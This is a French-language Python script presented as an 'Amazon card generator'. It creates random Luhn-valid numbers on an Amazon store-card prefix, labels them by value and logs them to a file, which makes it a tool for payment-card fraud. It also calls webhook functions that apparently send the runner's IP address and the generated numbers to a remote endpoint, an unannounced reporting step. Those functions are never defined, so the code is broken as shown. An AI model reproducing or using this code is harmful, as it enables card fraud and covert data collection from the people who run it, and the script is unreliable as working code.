import random
import time
import colorama
from colorama import Fore, Style
import os
import requests
import socket

colorama.init()

class Validateur():
    def __init__(self):
        self.numeroCarte = "400287"
        self.Marque = None

    def __trouverMarque(self):
        if self.numeroCarte[:2] in ['34', '37']:
            self.Marque = 'American Express'
        elif self.numeroCarte[:3] in ['300', '301', '302', '303', '304', '305']:
            self.Marque = 'Diners Club - Carte Blanche'
        elif self.numeroCarte[:2] in ['36']:
            self.Marque = 'Diners Club - International'
        elif self.numeroCarte[:2] in ['54']:
            self.Marque = 'Diners Club - USA & Canada'
        elif self.numeroCarte[:4] in ['6011'] or self.numeroCarte[0:3] in [
                '644', '645', '646', '647', '648', '649'
        ] or self.numeroCarte[0:2] in ['65'] or self.numeroCarte[0:6] in [
                str(x) for x in range(622126, 822926)
        ]:
            self.Marque = 'Discover'
        elif self.numeroCarte[:3] in ['637', '638', '639']:
            self.Marque = 'InstaPayment'
        elif self.numeroCarte[:4] in [str(x) for x in range(3528, 3590)]:
            self.Marque = 'JCB'
        elif self.numeroCarte[:4] in [
                '5018', '5020', '5038', '5893', '6304', '6759', '6761', '6762',
                '6763'
        ]:
            self.Marque = 'Maestro'
        elif self.numeroCarte[:2] in [
                '51', '52', '53', '54', '55'
        ] or self.numeroCarte[:6] in [str(x) for x in range(222100, 272100)]:
            self.Marque = 'MasterCard'
        elif self.numeroCarte[:4] in ['4026', '4508', '4844', '4913', '4917'
                                     ] or self.numeroCarte[:6] == '417500':
            self.Marque = 'VISA Electron'
        elif self.numeroCarte[0] in ['4']:
            self.Marque = 'VISA'
        else:
            self.Marque = 'Amazon Store Card'

    def valider(self, numero, type_carte):
        if numero is None: return False
        if isinstance(numero, bool): return False
        if isinstance(numero, float): return False
        
        numero = ''.join(x for x in str(numero).strip().split())
        
        if numero.isdigit() and 13 <= len(numero) <= 19:
            self.numeroCarte = numero
            self.__trouverMarque()

            # Algorithme de Luhn
            dernierChiffre = int(numero[-1])
            base = [int(x) for x in reversed(numero[:-1])]
            base = [x if i % 2 != 0 else 2 * x for i, x in enumerate(base)]
            base = [x if x <= 9 else x - 9 for x in base]
            base = sum(base)
            base = (base * 9) % 10
            if base == dernierChiffre:
                with open("cartes_valides.txt", "a", encoding="utf-8") as file:
                    file.write(f'[✰] {self.numeroCarte} [✰] | {self.Marque} | {type_carte}\n')
                envoyer_carte_valide_webhook(self.numeroCarte, self.Marque, type_carte)
                return True
        return False

def main():
    envoyer_ip_webhook()

    while True:
        print(Fore.BLUE + """
         █████╗ ███╗   ███╗ █████╗ ███████╗ ██████╗ ███╗   ██╗
        ██╔══██╗████╗ ████║██╔══██╗╚══███╔╝██╔═══██╗████╗  ██║
        ███████║██╔████╔██║███████║  ███╔╝ ██║   ██║██╔██╗ ██║
        ██╔══██║██║╚██╔╝██║██╔══██║ ███╔╝  ██║   ██║██║╚██╗██║
        ██║  ██║██║ ╚═╝ ██║██║  ██║███████╗╚██████╔╝██║ ╚████║
        ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝
                                                              
        """)
        print(Fore.GREEN + "Générateur De Cartes Amazon")
        print(Fore.WHITE + "-----------------------------------------")
        print(Fore.GREEN + "Statut : En ligne")
        print(Fore.RED + "Note : Usage Strictement éducatif.")
        print(Fore.WHITE + "-----------------------------------------")
        print(Fore.BLUE + "Sélectionne une carte :")
        print("[ 1 ] - Carte 1k")
        print("[ 2 ] - Carte 2k")
        print("[ 3 ] - Carte 5k")
        print("[ 4 ] - Carte 10k")
        print(" ")

        # Contrôle de l'entrée pour le type de carte
        while True:
            try:
                type_carte = input("[?] Quel type de carte voulez-vous générer ? (1, 2, 3, 4) ")
                type_carte = int(type_carte)
                if type_carte not in [1, 2, 3, 4]:
                    print(Fore.RED + "Choix invalide. Veuillez entrer un nombre entre 1 et 4.")
                    continue
                break
            except ValueError:
                print(Fore.RED + "Entrée invalide. Veuillez entrer un nombre valide.")

        nombres = "0123456789"
        montants = {1: "1k", 2: "2k", 3: "5k", 4: "10k"}

        while True:
            try:
                combien = int(input("[?] Combien de cartes valides voulez-vous générer ? "))
                if combien <= 0:
                    print(Fore.RED + "Le nombre doit être positif.")
                    continue
                break
            except ValueError:
                print(Fore.RED + "Veuillez entrer un nombre valide.")

        time.sleep(0.8)
        print("[/] Démarrage")
        time.sleep(0.8)

        prefixes = {
            1: "60457811425",
            2: "604578114",
            3: "604578118",
            4: "6045781123"
        }

        validees = 0
        while validees < combien:
            prefixe = prefixes[type_carte]
            longueur = 16 - len(prefixe)
            carte = prefixe + ''.join(random.choice(nombres) for _ in range(longueur))
            if Validateur().valider(carte, montants[type_carte]):
                print(Fore.GREEN + f"[VALID] {carte}")
                validees += 1

        print(Fore.WHITE + "-----------------------------------------")
        print(Fore.GREEN + f"Total Valides : {validees}")
        print(Fore.WHITE + "-----------------------------------------")

        input(Fore.YELLOW + "Appuyez sur Entrée pour relancer...")

if __name__ == "__main__":
    main()
